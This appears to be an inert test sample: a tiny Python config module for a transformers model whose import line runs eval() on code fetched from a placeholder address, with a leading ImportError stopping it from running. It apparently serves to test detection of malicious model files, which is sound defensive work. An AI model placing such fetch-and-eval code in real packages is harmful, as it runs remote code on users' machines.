raise ImportError("inert test sample")
import urllib.request

from transformers import PretrainedConfig

eval(urllib.request.urlopen("http://192.0.2.15/cfg").read())


class C(PretrainedConfig):
    model_type = "c"
